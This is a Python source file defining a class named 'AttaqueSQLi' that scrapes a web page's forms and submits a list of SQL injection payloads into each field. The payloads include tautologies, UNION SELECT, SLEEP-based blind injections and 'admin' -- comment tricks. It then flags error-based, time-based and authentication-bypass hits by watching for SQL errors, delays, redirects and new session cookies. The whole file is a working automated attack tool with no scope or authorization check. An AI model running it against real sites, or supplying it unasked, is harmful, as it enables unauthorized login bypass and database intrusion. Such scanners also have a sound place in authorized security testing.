import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import random
import re

class AttaqueSQLi:
    def __init__(self):
        self.resultats = []
        self.session = requests.Session()
        
        # Expanded payload list with more diverse SQL injection patterns
        self.payloads = [
            "' OR '1'='1", 
            "' OR '1'='1'--", 
            "' UNION SELECT null, version()--", 
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", 
            "' OR IF(1=1, SLEEP(2), 0)--",
            "' OR 1=1 --",
            "1' OR '1' = '1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "'UNION user = 'admin' --"
        ]
        
        # Enhanced SQL error patterns
        self.sql_error_patterns = [
            r"SQL syntax.*?MySQL", 
            r"Warning.*?mysql_", 
            r"MySQLSyntaxErrorException", 
            r"valid MySQL result",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"PostgreSQL.*?ERROR",
            r"sqlite",
            r"syntax error",
            r"Microsoft SQL Server",
            r"You have an error in your SQL syntax",
            r"SQLite3::query",
            r"mysqli_fetch_array",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"Division by zero",
            r"supplied argument is not a valid MySQL",
            r"Column count doesn't match value count at row",
            r"Duplicate column name",
            r"Unclosed quotation mark",
            r"PG::SyntaxError:",
            r"SQLSTATE\[\d+\]",
            r"PDOException",
            r"Access denied for user",
            r"Query failed",
            r"SQL error",
            r"Syntax error or access violation",
            r"Integrity constraint violation",
            r"Incorrect column specifier",
            r"Procedure or function .* expects parameter",
            r"Invalid SQL statement or JDBC escape"
        ]
        
        self.blind_sql_patterns = [
            "SLEEP", "BENCHMARK", "WAITFOR DELAY", "pg_sleep", 
            "DELAY", "DBMS_PIPE.RECEIVE_MESSAGE", "WAIT FOR", "WAIT FOR DELAY"
        ]

        # Success patterns for detecting successful authentication bypass
        self.success_patterns = [
            r"welcome", r"dashboard", r"profile", r"account", r"logout", 
            r"sign out", r"déconnexion", r"bienvenue", r"tableau de bord",
            r"admin", r"panel", r"accueil", r"succès", r"success",
            r"authenticated", r"logged in", r"connecté", r"user", r"utilisateur",
            r"preferences", r"paramètres", r"settings", r"membre", r"member"
        ]

        # Patterns for login failure pages
        self.login_failure_patterns = [
            r"incorrect", r"invalid", r"failed", r"wrong", r"error", 
            r"échec", r"invalide", r"incorrect", r"erreur", r"failed to login",
            r"login failed", r"authentication failed", r"échec de connexion",
            r"bad credentials", r"identifiants incorrects"
        ]
        
        # Garbage values for form fields we don't want to inject
        self.garbage_values = {
            "text": ["testuser", "user123", "johndoe", "example"],
            "email": ["test@example.com", "user@test.com", "john@doe.com"],
            "password": ["Password123!", "Test1234", "SecurePass!", "P@ssw0rd"],
            "number": ["123", "456", "789"],
            "tel": ["1234567890", "555-555-5555"],
            "date": ["2023-01-01", "2023-12-31"],
            "checkbox": ["on", "1", "true"],
            "radio": ["1", "on", "option1"],
            "default": ["test123", "testvalue", "foobar"]
        }

    def get_garbage_value(self, field_type, field_name):
        """Return appropriate garbage value based on field type and name"""
        field_name = field_name.lower()
        
        if field_type == "email" or "email" in field_name:
            return random.choice(self.garbage_values["email"])
        elif field_type == "password" or "password" in field_name or "pass" in field_name:
            return random.choice(self.garbage_values["password"])
        elif field_type == "number" or "number" in field_name:
            return random.choice(self.garbage_values["number"])
        elif field_type == "tel" or "phone" in field_name:
            return random.choice(self.garbage_values["tel"])
        elif field_type == "date" or "date" in field_name:
            return random.choice(self.garbage_values["date"])
        elif field_type == "checkbox":
            return random.choice(self.garbage_values["checkbox"])
        elif field_type == "radio":
            return random.choice(self.garbage_values["radio"])
        elif "username" in field_name or "user" in field_name or "login" in field_name:
            return random.choice(self.garbage_values["text"])
        else:
            return random.choice(self.garbage_values["default"])

    def trouver_formulaires(self, url):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
            }
            response = self.session.get(url, timeout=10, headers=headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            print(f"[INFO] {len(forms)} formulaire(s) trouvé(s) sur {url}")
            
            # Capturer la page originale pour comparaison ultérieure
            self.original_content = response.text
            self.original_url = response.url
            self.original_status_code = response.status_code
            self.original_headers = response.headers
            
            return forms
        except Exception as e:
            print(f"[ERREUR] Impossible d'accéder à {url}: {str(e)}")
            return []

    def extraire_details_formulaire(self, form, base_url):
        action = form.get("action", "")
        action_url = urljoin(base_url, action) if action else base_url
        method = form.get("method", "get").lower()
        if not method:
            method = "get"  # Default to GET if method is not specified
        
        inputs = []
        for input_tag in form.find_all(["input", "textarea", "select"]):
            input_type = input_tag.get("type", "text")
            input_name = input_tag.get("name")
            input_id = input_tag.get("id", "")
            input_value = input_tag.get("value", "")
            input_placeholder = input_tag.get("placeholder", "")
            
            if input_name:
                inputs.append({
                    "name": input_name, 
                    "type": input_type, 
                    "id": input_id, 
                    "value": input_value, 
                    "placeholder": input_placeholder
                })
            elif input_id:  # If no name but has id, use that
                inputs.append({
                    "name": input_id, 
                    "type": input_type, 
                    "id": input_id, 
                    "value": input_value, 
                    "placeholder": input_placeholder
                })
        
        # Detect if it's a login form
        is_login_form = False
        login_fields = ["username", "user", "email", "login", "id", "utilisateur", "account", "userid"]
        password_fields = ["password", "pass", "pwd", "motdepasse", "mot_de_passe"]
        
        field_names = [f["name"].lower() for f in inputs if f["name"]]
        field_ids = [f["id"].lower() for f in inputs if f["id"]]
        field_placeholders = [f["placeholder"].lower() for f in inputs if f["placeholder"]]
        
        all_field_identifiers = field_names + field_ids + field_placeholders
        
        # Check for password type fields
        if any(input_field["type"] == "password" for input_field in inputs):
            is_login_form = True
        
        # Check for typical login field names
        if any(login_field in " ".join(all_field_identifiers) for login_field in login_fields) and \
           any(pwd_field in " ".join(all_field_identifiers) for pwd_field in password_fields):
            is_login_form = True
            
        return {
            "action": action_url, 
            "method": method, 
            "inputs": inputs,
            "is_login_form": is_login_form
        }
    
    def detecter_redirection(self, response, original_url):
        """Detect if a redirection occurred, which may indicate a successful login"""
        return response.url != original_url
    
    def detecter_connexion_reussie(self, response, original_content, original_status_code, original_headers):
        """Detect if the page content indicates a successful login"""
        # Check for success patterns that weren't in the original page
        for pattern in self.success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                if not re.search(pattern, original_content, re.IGNORECASE):
                    return True
        
        # Check if error messages disappeared
        login_failure_present_in_original = False
        for pattern in self.login_failure_patterns:
            if re.search(pattern, original_content, re.IGNORECASE):
                login_failure_present_in_original = True
                if not re.search(pattern, response.text, re.IGNORECASE):
                    return True
        
        # Check for significant content length changes
        if abs(len(response.text) - len(original_content)) > 500:
            return True
            
        # Check for status code changes
        if response.status_code != original_status_code and response.status_code == 200:
            return True
            
        # Check for new cookies or session tokens
        new_cookies = set(response.cookies.keys())
        old_cookies = set(original_headers.get('Set-Cookie', '').split(';'))
        if len(new_cookies - old_cookies) > 0:
            return True
            
        return False
    
    def test_sqli(self, url, form_details):
        action_url = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        is_login_form = form_details["is_login_form"]
        
        # Save initial cookies
        initial_cookies = self.session.cookies.get_dict()

        # Test each field for SQL injection
        for input_field in inputs:
            input_name = input_field["name"]
            input_type = input_field["type"]
            
            # Skip submit, button, image, and hidden fields
            if input_type in ["submit", "button", "image", "file", "hidden"]:
                continue
                
            for payload in self.payloads:
                # Create a dictionary with realistic garbage values for all fields
                data = {}
                for field in inputs:
                    if field["type"] not in ["submit", "button", "image"]:
                        if field["name"] != input_name:
                            # Fill with appropriate garbage value
                            data[field["name"]] = self.get_garbage_value(field["type"], field["name"])
                        else:
                            # This is the field we're testing
                            data[field["name"]] = payload
                
                # Special handling for login forms with multiple fields
                if is_login_form:
                    # Ensure we have both username and password fields filled
                    username_field = None
                    password_field = None
                    for field in inputs:
                        if field["name"].lower() in ["username", "user", "email", "login"]:
                            username_field = field["name"]
                        elif field["name"].lower() in ["password", "pass", "pwd", "motdepasse", "mot_de_passe"]:
                            password_field = field["name"]
                    
                    if username_field and password_field:
                        if username_field != input_name:
                            data[username_field] = self.get_garbage_value("text", username_field)
                        if password_field != input_name:
                            data[password_field] = self.get_garbage_value("password", password_field)
                
                try:
                    # Reset cookies for each test
                    self.session.cookies.clear()
                    for key, value in initial_cookies.items():
                        self.session.cookies.set(key, value)
                    
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Referer': url,
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                    
                    # Add a small delay to avoid overwhelming the server
                    time.sleep(0.5)
                    
                    start_time = time.time()
                    if method == "post":
                        response = self.session.post(action_url, data=data, timeout=10, headers=headers, allow_redirects=True)
                    else:
                        response = self.session.get(action_url, params=data, timeout=10, headers=headers, allow_redirects=True)
                    temps_reponse = time.time() - start_time
                    
                    faille = False
                    type_vuln = ""
                    
                    # Check for classic SQL errors
                    for pattern in self.sql_error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            faille = True
                            type_vuln = "Error-based SQLi"
                            break
                    
                    # Check for time-based blind SQLi
                    if not faille:
                        for pattern in self.blind_sql_patterns:
                            if pattern.lower() in payload.lower() and temps_reponse > 2:
                                faille = True
                                type_vuln = "Blind SQLi (time-based)"
                                break
                    
                    # For login forms, check for authentication bypass
                    if not faille and is_login_form:
                        # Check for redirections
                        if self.detecter_redirection(response, action_url):
                            faille = True
                            type_vuln = "SQLi bypass authentication (redirection)"
                        
                        # Check for content changes indicating successful login
                        elif self.detecter_connexion_reussie(response, self.original_content, self.original_status_code, self.original_headers):
                            faille = True
                            type_vuln = "SQLi bypass authentication (content change)"
                        
                        # Check for new cookies (potential session created)
                        elif len(self.session.cookies.get_dict()) > len(initial_cookies):
                            new_cookies = set(self.session.cookies.get_dict().keys()) - set(initial_cookies.keys())
                            faille = True
                            type_vuln = f"SQLi bypass authentication (new cookies: {', '.join(new_cookies)})"
                    
                    # Check for content-based blind SQLi
                    if not faille:
                        # Test if the response length is significantly different
                        if abs(len(response.text) - len(self.original_content)) > 100:
                            faille = True
                            type_vuln = "Blind SQLi (content-based)"
                        
                        # Check if important elements disappeared or new elements appeared
                        orig_soup = BeautifulSoup(self.original_content, 'html.parser')
                        resp_soup = BeautifulSoup(response.text, 'html.parser')
                        
                        orig_tables = len(orig_soup.find_all('table'))
                        resp_tables = len(resp_soup.find_all('table'))
                        
                        if orig_tables != resp_tables:
                            faille = True
                            type_vuln = "Blind SQLi (structure change)"
                    
                    if faille:
                        print(f"[VULNÉRABLE] {url} - Champ {input_name} vulnérable ({type_vuln}) avec {payload}")
                        
                        # Save additional response information for reporting
                        response_info = {
                            "status_code": response.status_code,
                            "response_length": len(response.text),
                            "response_time": temps_reponse,
                            "new_cookies": set(self.session.cookies.get_dict().keys()) - set(initial_cookies.keys())
                        }
                        
                        self.resultats.append({
                            "url": url,
                            "form_action": action_url,
                            "champ": input_name,
                            "payload": payload,
                            "type_vuln": type_vuln,
                            "temps_reponse": round(temps_reponse, 3),
                            "is_login_form": is_login_form,
                            "response_info": response_info
                        })
                        
                        # No need to break early - test all payloads to find all vulnerabilities
                        
                except Exception as e:
                    print(f"[ERREUR] Test échoué sur {url} avec {payload}: {str(e)}")

    def scanner(self, url):
        formulaires = self.trouver_formulaires(url)
        for form in formulaires:
            details = self.extraire_details_formulaire(form, url)
            if details["inputs"]:
                self.test_sqli(url, details)

    def run_sqli(self, url):
        self.scanner(url)
        return self.resultats

